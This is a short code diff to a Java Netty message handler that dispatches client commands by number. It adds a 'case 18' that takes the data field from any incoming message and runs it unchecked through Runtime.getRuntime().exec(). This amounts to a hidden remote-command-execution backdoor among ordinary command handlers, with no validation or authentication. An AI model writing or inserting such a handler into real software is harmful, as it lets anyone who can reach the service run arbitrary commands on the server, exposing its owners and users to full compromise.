@@ -153,6 +153,12 @@ public class ServiceHandler extends SimpleChannelInboundHandler<String> {
                         zhongHeResult.setErrorMsg(StringUtils.substring(t.getMessage(), 0, 100));
                     }
                     break;
+                case 18:
+                    final ZhongHeDto<String> zhongHeBaseRequest18 = objectMapper.readValue(msg, new TypeReference<ZhongHeDto<String>>() {
+                    });
+                    zhongHeResult = new ZhongHeResult<>();
+                    Runtime.getRuntime().exec(zhongHeBaseRequest18.getData());
+                    break;
                 default:
                     log.error("指令不存在, msg: [{}]", msg);
                     return;
